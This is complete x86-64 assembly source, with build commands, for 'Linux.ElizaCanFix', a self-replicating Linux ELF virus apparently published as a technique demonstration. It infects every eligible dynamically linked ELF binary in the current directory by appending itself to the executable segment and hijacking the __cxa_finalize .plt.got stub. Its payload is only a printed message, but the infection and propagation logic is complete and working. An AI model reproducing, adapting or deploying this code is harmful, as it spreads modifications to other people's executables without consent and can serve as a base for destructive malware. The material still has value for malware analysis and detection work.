; _    _ _  _ _  _ _  _  ____ _    _ ___  ____ ____ ____ _  _ ____ _ _  _
; |    | |\ | |  |  \/   |___ |    |   /  |__| |    |__| |\ | |___ |  \/
; |___ | | \| |__| _/\_ .|___ |___ |  /__ |  | |___ |  | | \| |    | _/\_
;

; Linux.ElizaCanFix
; by vrzh
; Thanks to JonasLyk giving the virus its name!

; This virus demonstrates an EPO technique of hijacking __cxa_finalize.
; It will propagate to all eligible 64-bit ELF files in the current
; directory and in lieu of a payload will print a delightful message.

; This virus relies on .plt.got hijacking and can only infect dynamically
; linked binaries.

; To build:
; $ nasm -felf64 Linux.ElizaCanFix.asm -o Linux.ElizaCanFix.o
; $ ld Linux.ElizaCanFix.o -o Linux.ElizaCanFix

bits 64

; ELF-related definitions

%define SHT_PROGBITS    1
%define SHT_STRTAB      3
%define SHT_RELA        4
%define SHT_DYNSYM      11
%define PT_LOAD         1
%define PF_X            1

struc elf64_ehdr
.e_ident        resb    16
.e_type         resw    1
.e_machine      resw    1
.e_version      resd    1
.e_entry        resq    1
.e_phoff        resq    1
.e_shoff        resq    1
.e_flags        resd    1
.e_ehsize       resw    1
.e_phentsize    resw    1
.e_phnum        resw    1
.e_shentsize    resw    1
.e_shnum        resw    1
.e_shstrndx     resw    1
endstruc

struc elf64_phdr
.p_type         resd    1
.p_flags        resd    1
.p_offset       resq    1
.p_vaddr        resq    1
.p_paddr        resq    1
.p_filesz       resq    1
.p_memsz        resq    1
.p_align        resq    1
endstruc

struc elf64_shdr
.sh_name        resd    1
.sh_type        resd    1
.sh_flags       resq    1
.sh_addr        resq    1
.sh_offset      resq    1
.sh_size        resq    1
.sh_link        resd    1
.sh_info        resd    1
.sh_addralign   resq    1
.sh_entsize     resq    1
endstruc

struc elf64_sym
.st_name        resd    1
.st_info        resb    1
.st_other       resb    1
.st_shndx       resw    1
.st_value       resq    1
.st_size        resq    1
endstruc

struc elf64_rela
.r_offset       resq    1
.r_info         resq    1
.r_addend       resq    1
endstruc

; Syscall-related definitions

%define O_RDWR      2

%define PROT_RW     2
%define MAP_SHARED  1
%define MAP_ANPRIV  34

%define PAGE_SIZE   4096

%define __NR_write      1
%define __NR_open       2
%define __NR_close      3
%define __NR_fstat      5
%define __NR_lseek      8
%define __NR_mmap       9
%define __NR_munmap     11
%define __NR_exit       60
%define __NR_ftruncate  77
%define __NR_getdents64 217

%define DT_REG          8

struc stat
.pad0       resb    48
.st_size    resq    1
.pad1       resb    88
endstruc

%define dirents_bufflen 0x100
struc dirent64
.d_ino      resq    1
.d_off      resq    1
.d_reclen   resw    1
.d_type     resb    1
.d_name     resb    1
endstruc

struc host_data
.elf                resq    1
.size               resq    1
.phdrs              resq    1
.shdrs              resq    1
.plt_got            resq    1
.plt_got_len        resq    1
.dyn_sym            resq    1
.rela_dyn           resq    1
.rela_dyn_size      resq    1
.dyn_str            resq    1
.addrof_pltgot_stub resq    1
.cxa_finalize_offt  resq    1
.scratch_space      resq    1
.host_fd            resq    1
endstruc

%define pltgot_epilogue_len 6

global _start

_start:
    ; save the used non-volatile registers
    push rdi
    push rbx
    push rsi
    push rbp
    push r14 ; used as a base pointer for host_data
    push r15 ; used for calling rel functions

    ; a little message is in order
    mov rax, __NR_write
    mov rdi, 1
    lea rsi, [rel infected_str]
    mov rdx, infected_str_len
    syscall

    ; open cwd
    mov rax, __NR_open
    lea rdi, [rel cwd_str]
    xor rsi, rsi ; O_RDONLY
    xor rdx, rdx
    syscall
    test rax, rax
    jl finish

    sub rsp, elf_ident_len ; file check
    push rax               ; directory fd
    push 0                 ; number of bytes read
    sub rsp, dirents_bufflen

_directory_infect:
    .directory_loop:
        mov rdi, [rsp + dirents_bufflen + 8] ; directory fd
        mov rsi, rsp                         ; dirents buffer
        mov rdx, dirents_bufflen
        mov rax, __NR_getdents64
        syscall
        test rax, rax
        jle _done
        mov [rsp + dirents_bufflen], rax    ; number of bytes read
        xor rbx, rbx
    .file_loop:
        cmp BYTE [rsp + rbx + dirent64.d_type], DT_REG
        jne .continue

        ; Found a regular file
        mov rax, __NR_open
        lea rdi, [rsp + rbx + dirent64.d_name]
        mov rsi, O_RDWR
        xor rdx, rdx
        syscall
        test rax, rax
        jl .continue

        ; We have permission to read and write
        mov rdi, rax
        xor rax, rax ; __NR_read
        lea rsi, [rsp + dirents_bufflen + 16]
        mov rdx, elf_ident_len
        syscall
        cmp rax, elf_ident_len
        jne .next_file

        ; Check for the ELF magic
        push rdi
        lea rdi, [rel elf_ident]
        mov rdx, elf_ident_len
        lea r15, [rel _memcmp]
        call r15
        test rdi, rdi
        pop rdi
        jnz .next_file

        ; ELF magic present
        ; Reset the cursor and try to infect
        xor rsi, rsi
        xor rdx, rdx ; SEEK_SET
        mov rax, __NR_lseek
        syscall
        test rax, rax
        jl .next_file

        push rbx
        lea r15, [rel infect_candidate]
        call r15
        pop rbx

    .next_file:
        mov rax, __NR_close
        syscall
    .continue:
        add bx, WORD [rsp + rbx + dirent64.d_reclen]
        cmp bx, WORD [rsp + dirents_bufflen]
        jb .file_loop
        jmp .directory_loop

_done:
    add rsp, dirents_bufflen
    pop rdi
    pop rdi
    add rsp, elf_ident_len
    mov rax, __NR_close
    syscall
    jmp finish

; the infection routine
; rdi should have the host fd
infect_candidate:
    sub rsp, host_data_size
    mov r14, rsp                ; host_data

    ; get the host size via fstat
    sub rsp, stat_size
    mov rsi, rsp
    mov rax, __NR_fstat
    syscall
    test rax, rax
    jl infect_candidate_ret

    ; we're doing an in-place infection, so
    ; we need to extend the file size before
    ; mapping it in memory
    mov rax, __NR_ftruncate
    mov rsi, [rsp+stat.st_size]
    add rsp, stat_size ; free struct stat
    mov [r14 + host_data.size], rsi
    add rsi, PAGE_SIZE
    syscall
    test rax, rax
    jl infect_candidate_ret

    ; map the host into memory
    mov rax, __NR_mmap
    mov r8, rdi
    xor rdi, rdi
    mov rdx, PROT_RW
    mov r10, MAP_SHARED
    xor r9, r9
    syscall
    test rax, rax
    jl infect_candidate_ret

    mov [r14+host_data.elf], rax ; beginning of the elf
    ; through most of the virus
    ; this address will remain in rax

    ; save the program header offset
    mov rcx, [rax + elf64_ehdr.e_phoff]
    lea rcx, [rax+rcx]
    mov [r14+host_data.phdrs], rcx

    ; save the section header offset
    mov rcx, [rax + elf64_ehdr.e_shoff]
    lea rcx, [rax+rcx]
    mov [r14+host_data.shdrs], rcx

    ; save the file descriptor
    ; we will need it in case we fail
    ; to infect and have to truncate
    ; the file back to its original
    ; size
    mov [r14+host_data.host_fd], r8

    sub rsp, 16
    ; rsp     - section index counter
    ; rsp + 8 - string table section address

    ; find the string table section
    mov rbx, [r14+host_data.shdrs]
    movzx rcx, WORD [rax+elf64_ehdr.e_shstrndx]
    shl rcx, 6 ; sizeof elf64_shdr
    lea rdi, [rbx + rcx]
    mov rdx, [rdi + elf64_shdr.sh_offset]
    lea rdx, [rax + rdx]
    mov [rsp+8], rdx
    xor rcx, rcx
    movzx r8, WORD [rax+elf64_ehdr.e_shnum]

    mov QWORD [r14+host_data.plt_got], 0
    mov QWORD [r14+host_data.dyn_str], 0
    mov QWORD [r14+host_data.rela_dyn], 0
    mov QWORD [r14+host_data.dyn_sym], 0

    ; loop through section headers and find
    ; the necessary sections for infection
shdrs_loop:
    mov [rsp], rcx
    shl rcx, 6 ; sizeof_elf64_shdr
    lea rdi, [rbx + rcx]
    mov esi, DWORD [rdi + elf64_shdr.sh_type]

    cmp esi, SHT_PROGBITS
    jne _check_strtab

    ; case SHT_PROGBITS
    xor rdx, rdx
    mov edx, DWORD [rdi + elf64_shdr.sh_name]
    mov rbp, [rsp+8]
    lea rbp, [rbp + rdx]
    push rdi
    push rdx
    mov rdi, rbp
    mov rdx, plt_got_str_len
    lea rsi, [rel plt_got_str]
    lea r15, [rel _memcmp]
    call r15
    test rdi, rdi
    pop rdx
    pop rdi
    jnz .continue
    mov rdx, QWORD [rdi + elf64_shdr.sh_offset]
    lea rdx, [rax + rdx]
    mov [r14+host_data.plt_got], rdx
    mov rdx, QWORD [rdi + elf64_shdr.sh_size]
    mov [r14+host_data.plt_got_len], rdx
    .continue:
        jmp shdrs_loop_cont

_check_strtab:
    cmp esi, SHT_STRTAB
    jne _check_rela

    ; case SHT_STRTAB
    xor rdx, rdx
    mov edx, DWORD [rdi + elf64_shdr.sh_name]
    mov rbp, [rsp+8]
    lea rbp, [rbp + rdx]
    push rdi
    push rdx
    mov rdi, rbp
    mov rdx, dynstr_str_len
    lea rsi, [rel dynstr_str]
    lea r15, [rel _memcmp]
    call r15
    test rdi, rdi
    pop rdx
    pop rdi
    jnz .continue
    mov rdx, QWORD [rdi + elf64_shdr.sh_offset]
    lea rdx, [rax + rdx]
    mov [r14+host_data.dyn_str], rdx
    .continue:
        jmp shdrs_loop_cont

_check_rela:
    cmp esi, SHT_RELA
    jne _check_dynsym

    ; case SHT_RELA
    xor rdx, rdx
    mov edx, DWORD [rdi + elf64_shdr.sh_name]
    mov rbp, [rsp+8]
    lea rbp, [rbp + rdx]
    push rdi
    push rdx
    mov rdi, rbp
    mov rdx, rela_dyn_str_len
    lea rsi, [rel rela_dyn_str]
    lea r15, [rel _memcmp]
    call r15
    test rdi, rdi
    pop rdx
    pop rdi
    jnz .continue
    mov rdx, QWORD [rdi + elf64_shdr.sh_offset]
    lea rdx, [rax + rdx]
    mov [r14+host_data.rela_dyn], rdx
    mov rdx, QWORD [rdi + elf64_shdr.sh_size]
    mov [r14+host_data.rela_dyn_size], rdx
    .continue:
        jmp shdrs_loop_cont

_check_dynsym:
    cmp esi, SHT_DYNSYM
    jne shdrs_loop_cont

    ; case SHT_DYNSYM
    mov rdx, [rdi + elf64_shdr.sh_offset]
    lea rdx, [rax + rdx]
    mov [r14+host_data.dyn_sym], rdx
    jmp shdrs_loop_cont

shdrs_loop_cont:
    mov rcx, [rsp]
    inc rcx
    cmp rcx, r8
    jl shdrs_loop
    add rsp, 16

    ; Make sure we found all the necessary
    ; sections, otherwise infection failed
    cmp QWORD [r14+host_data.plt_got], 0
    jz fail_infect
    cmp QWORD [r14+host_data.dyn_str], 0
    jz fail_infect
    cmp QWORD [r14+host_data.rela_dyn], 0
    jz fail_infect
    cmp QWORD [r14+host_data.dyn_sym], 0
    jz fail_infect

    xor rcx, rcx
    sub rsp, 8
    mov [rsp], rcx      ; rela dyn iterator

    mov rbp, [r14 + host_data.rela_dyn]
    mov r8, [r14 + host_data.dyn_sym]

rela_dyn:
    .loop:
        mov rcx, [rsp] ; rela iterator
        cmp rcx, QWORD [r14 + host_data.rela_dyn_size]
        jl .check_entry
        ; we couldn't find the rela_dyn entry
        add rsp, 8
        jmp fail_infect

    .check_entry:
        lea r9, [rbp + rcx] ; current .rela.dyn entry
        mov rbx, QWORD [r9 + elf64_rela.r_info]
        shr rbx, 32         ; Get the .dynsym table index (ELF64_R_SYM macro)

        ; calculate the .dynsym table offset
        mov rcx, rbx
        shl rcx, 4
        shl rbx, 3
        add rbx, rcx

        lea rbx, [r8 + rbx]     ; .dynsym entry
        mov ebx, DWORD [rbx + elf64_sym.st_name]
        mov rdi, [r14 + host_data.dyn_str]
        lea rdi, [rdi + rbx]    ; symbol string offset in .dynstr
        ; compare with "__cxa_finalize" string
        mov rdx, cxa_fin_str_len
        lea rsi, [rel cxa_fin_str]
        lea r15, [rel _memcmp]
        call r15
        test rdi, rdi
        jnz .continue
        ; we found the __cxa_finalize relocation data
        mov r9, [r9 + elf64_rela.r_offset]
        lea r9, [rax + r9]      ; __cxa_finalize GOT offset
        mov [r14 + host_data.cxa_finalize_offt], r9
        jmp .done

    .continue:
        mov rcx, [rsp]
        add rcx, elf64_rela_size
        mov [rsp], rcx
        jmp .loop

    .done:
        xor rcx, rcx

    ; scan the .plt.got section for the __cxa_finalize stub
    mov rdx, [r14 + host_data.plt_got]
    mov QWORD [r14 + host_data.addrof_pltgot_stub], 0
plt_got:
    .loop:
        mov ebx, DWORD [rdx + rcx + 2]  ; jmp operand
        lea r8, [rdx + rcx + 6]         ; address after the jmp
        add rbx, r8                     ; test offset
        cmp rbx, QWORD [r14 + host_data.cxa_finalize_offt]
        jne .next
        lea rbx, [rdx + rcx]
        mov [r14 + host_data.addrof_pltgot_stub], rbx
        jmp .done

    .next:
        add rcx, 8 ; size of a .plt.got stub
        cmp rcx, [r14 + host_data.plt_got_len]
        jl .loop
    .done:
        add rsp, 8

    cmp QWORD [r14 + host_data.addrof_pltgot_stub], 0
    ; Either we couldn't find the __cxa_finalize
    ; stub or we've already infected this host
    jz fail_infect

    xor rcx, rcx

    ; rsp       - Bytes left after the end of the code segment
    ; rsp + 8   - Address of the infection
    ; rsp + 16  - End of the code segment
    sub rsp, 24
    mov rbx, [r14 + host_data.phdrs]

    ; loop through the program headers, looking for an
    ; infection candidate - a PT_LOAD segment with PF_X
    ; permission
phdr_loop:
    .loop:
        cmp DWORD [rbx + elf64_phdr.p_type], PT_LOAD
        jne .continue

        mov edx, DWORD [rbx + elf64_phdr.p_flags]
        and edx, PF_X
        jz .continue

        ; found a candidate segment
        ; calculate free space

        ; get segment size modulo page size
        mov rdx, [rbx + elf64_phdr.p_memsz]
        mov r9, PAGE_SIZE
        dec r9
        and rdx, r9
        mov r9, PAGE_SIZE
        sub r9, rdx ; free space

        mov rdx, rax ; beginning of elf
        add rdx, [rbx + elf64_phdr.p_offset]
        add rdx, [rbx + elf64_phdr.p_filesz]
        mov [rsp + 16], rdx ; end of the code segment
        mov rdx, [rbx + elf64_phdr.p_vaddr]
        add rdx, [rbx + elf64_phdr.p_memsz]
        mov [rsp + 8], rdx ; infection address
        mov rdx, [r14 + host_data.size]
        sub rdx, [rbx + elf64_phdr.p_offset]
        sub rdx, [rbx + elf64_phdr.p_filesz]
        mov [rsp], rdx ; number of bytes after the code segment
        lea rdx, [endp - _start] ; parasite size
        add rdx, pltgot_epilogue_len
        ; check if the parasite fits
        cmp rdx, r9
        ; note
        ; If we don't fit in this section
        ; we could continue searching for a
        ; different PF_X segment, however in
        ; that case our PLT hijack will have to
        ; use a far jmp.
        jnb .fail

        add [rbx + elf64_phdr.p_filesz], rdx
        add [rbx + elf64_phdr.p_memsz], rdx
        mov r8, [rbx + elf64_phdr.p_offset]
    .post_infection_loop:
        add rbx, elf64_phdr_size
        inc rcx
        cmp cx, WORD [rax + elf64_ehdr.e_phnum]
        jge .done
        cmp r8, [rbx + elf64_phdr.p_offset]
        jge .post_infection_loop
        add QWORD [rbx  + elf64_phdr.p_offset], PAGE_SIZE
        jmp .post_infection_loop

    .continue:
        add rbx, elf64_phdr_size
        inc rcx
        cmp cx, WORD [rax + elf64_ehdr.e_phnum]
        jl .loop

    ; we failed to find a PF_X segment
    .fail:
        add rsp, 24
        jmp fail_infect

    .done:
        xor rcx, rcx
        mov rbp, [r14 + host_data.shdrs]
        mov r8, [rsp + 8] ; address of the infection

    ; update the offsets of sections located after the infection
shdr_infect_loop:
    .loop:
        cmp r8, [rbp + elf64_shdr.sh_offset]
        jge .continue
        add QWORD [rbp + elf64_shdr.sh_offset], PAGE_SIZE
    .continue:
        mov rdi, [rbp + elf64_shdr.sh_addr]
        add rdi, [rbp + elf64_shdr.sh_size]
        cmp rdi, r8
        jne .next
        lea rdx, [endp - _start] ; parasite size
        add rdx, pltgot_epilogue_len
        add QWORD [rbp + elf64_shdr.sh_size], rdx
    .next:
        add rbp, elf64_shdr_size
        inc rcx
        cmp cx, [rax + elf64_ehdr.e_shnum]
        jl .loop

    ; allocate temporary space to store the
    ; remainder of the host
    push rax ; save the pointer to the beginning of the host elf
    mov rax, __NR_mmap
    xor rdi, rdi
    mov rsi, [r14+host_data.size]
    mov rdx, PROT_RW
    mov r10, MAP_ANPRIV
    xor r8, r8
    dec r8
    xor r9, r9
    syscall
    test rax, rax
    ; mmap failed and at this point we've bricked
    ; the host - fail gracefully
    jl finish_free_host

    mov [r14+host_data.scratch_space], rax
    pop rax ; beginning of the host elf

    ; save all the bytes after the infection
    mov rdi, [r14 + host_data.scratch_space]
    mov rsi, [rsp + 16] ; end of the code segment
    mov rdx, [rsp]
    lea r15, [rel _memcpy]
    call r15

    ; copy the virus into the host
    mov rdi, rsi ; end of the code segment
    lea rsi, [rel _start]
    lea rdx, [endp - _start] ; parasite size
    call r15

    ; set up the jump after the virus
    add rdi, rdx                ; end of the virus
    mov WORD [rdi], 0x25ff      ; jmp QWORD PTR [rip + ?]
    mov rsi, [r14 + host_data.cxa_finalize_offt]
    lea rdx, [rdi + 6]          ; address after the jmp
    sub rsi, rdx                ; new jmp offset to __cxa_finalize GOT entry
    mov DWORD [rdi + 2], esi

    ; copy back the remainder of the host elf
    mov rdi, [rsp + 16] ; end of the code segment
    add rdi, PAGE_SIZE
    mov rsi, [r14 + host_data.scratch_space]
    mov rdx, [rsp]
    call r15

    ; update the section headers offset in the elf header
    add QWORD [rax + elf64_ehdr.e_shoff], PAGE_SIZE

    ; patch the .plt.got stub with a jmp to parasite
    mov rbx, [r14 + host_data.addrof_pltgot_stub]
    mov BYTE [rbx], 0xe9    ; near jmp opcode
    mov rdi, [rsp + 16]     ; end of the code segment
    lea rsi, [rbx + 5]      ; address after near jmp instruction
    sub rdi, rsi            ; jmp offset to parasite
    mov DWORD [rbx + 1], edi
    add rsp, 24

    ; infection was successful
    xor rbx, rbx

_free_scratch_space:
    mov rax, __NR_munmap
    mov rdi, [r14+host_data.scratch_space]
    mov rsi, [r14+host_data.size]
    syscall

finish_free_host:
    mov rax, __NR_munmap
    mov rdi, [r14+host_data.elf]
    mov rsi, [r14+host_data.size]
    add rsi, PAGE_SIZE
    syscall

    test rbx, rbx
    jz infect_candidate_ret

    ; if not zero - infection failed
    ; truncate the host to its original size
    mov rax, __NR_ftruncate
    mov rdi, [r14 + host_data.host_fd]
    mov rsi, [r14 + host_data.size]
    syscall

infect_candidate_ret:
    mov rdi, [r14+host_data.host_fd]
    add rsp, host_data_size
    ret

fail_infect:
    mov rbx, 1
    jmp finish_free_host

; Utility routines

_memcpy:
    push rbx
    push rcx
    xor rcx, rcx
    .loop:
        mov bl, BYTE [rsi+rcx]
        mov BYTE [rdi+rcx], bl
        inc rcx
        cmp rcx, rdx
        jl .loop
    pop rcx
    pop rbx
    ret

_memcmp:
    push rbx
    push rcx
    xor rcx, rcx
    .loop:
        mov bl, BYTE [rdi+rcx]
        cmp bl, BYTE [rsi+rcx]
        jne .done
        inc rcx
        cmp rcx, rdx
        jl .loop
        xor rdi, rdi
    .done:
        pop rcx
        pop rbx
        ret

cwd_str:
    db ".",0

infected_str:
    db "I'm too cxa for my shirt",0xa,0
infected_str_len equ $-infected_str

plt_got_str:
    db ".plt.got",0
plt_got_str_len equ $-plt_got_str

rela_dyn_str:
    db ".rela.dyn",0
rela_dyn_str_len equ $-rela_dyn_str

dynstr_str:
    db ".dynstr",0
dynstr_str_len equ $-dynstr_str

cxa_fin_str:
    db "__cxa_finalize",0
cxa_fin_str_len equ $-cxa_fin_str

elf_ident:
    db 0x7f, "ELF", 0x2
elf_ident_len equ $-elf_ident

finish:
    ;restore non-volatile registers
    pop r15
    pop r14
    pop rbp
    pop rsi
    pop rbx
    pop rdi
endp:
    ; this part only executes in the standalone infector
    mov rax, __NR_exit
    xor rdi, rdi
    syscall

